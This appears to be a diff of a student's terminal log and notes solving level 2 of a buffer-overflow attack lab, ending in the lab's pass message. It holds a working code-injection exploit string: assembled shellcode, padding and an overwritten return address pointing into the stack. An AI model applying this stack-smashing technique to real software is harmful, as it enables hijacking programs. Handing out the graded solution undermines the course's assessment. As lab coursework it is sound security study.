@@ -101,4 +101,46 @@ Dump of assembler code for function touch2:
    0x0000000000401921 <+84>:    jmp    0x4018fe <touch2+49>
 End of assembler dump.
 (gdb) quit
+//WE HAVE A PROBLEM HERE. AS IS, THE HACK CAUSES A SEGFAULT AS WE DON'T APPEAR TO BE ABLE TO OVERWRITE BEYOND THE RETURN ADDRESS
+//LUCKILY, THERE IS AWAY AROUND THIS IF WE ADD ANOTHER ASSEMBLY INSTRUCTION
 [osbe@cdmcscspprd01 target17]$ emacs input2.txt
+[osbe@cdmcscspprd01 target17]$ emacs input2.s
+[osbe@cdmcscspprd01 target17]$ gcc -c input2.s
+[osbe@cdmcscspprd01 target17]$ ls
+cookie.txt  farm.c   input2.o        input2.s   input2.txt   input-raw.txt  input.txt~  rtarget
+ctarget     hex2raw  input2-raw.txt  input2.s~  input2.txt~  input.txt      README.txt
+[osbe@cdmcscspprd01 target17]$ objdmp -d input2.o
+-bash: objdmp: command not found
+[osbe@cdmcscspprd01 target17]$ objdump -d input2.o
+
+input2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 56 db eb 76    mov    $0x76ebdb56,%rdi
+   7:   68 cd 18 40 00          pushq  $0x4018cd
+   c:   c3                      retq
+[osbe@cdmcscspprd01 target17]$ emacs input2.txt
+
+/* Our new txt file will look like this
+
+48 c7 c7 56 db eb 76 68 //This sets $rdi to our cookie (register for our first argument)
+cd 18 40 00 c3 00 00 00 //Pushes the address of touch 2 onto the stack and then returns
+00 00 00 00 00 00 00 00 //Padding up to 56 bytes
+00 00 00 00 00 00 00 00 //Padding up to 56 bytes
+00 00 00 00 00 00 00 00 //Padding up to 56 bytes
+00 00 00 00 00 00 00 00 //Padding up to 56 bytes
+00 00 00 00 00 00 00 00 //Padding up to 56 bytes
+88 a0 61 55 00 00 00 00 //This directs the program to the "top" where the address to touch 2 is waiting
+
+[osbe@cdmcscspprd01 target17]$ ./hex2raw < input2.txt > input-raw.txt
+[osbe@cdmcscspprd01 target17]$ ./hex2raw < input2.txt > input2-raw.txt
+[osbe@cdmcscspprd01 target17]$ ./ctarget -i input2-raw.txt
+Cookie: 0x76ebdb56
+Touch2!: You called touch2(0x76ebdb56)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+[osbe@cdmcscspprd01 target17]$
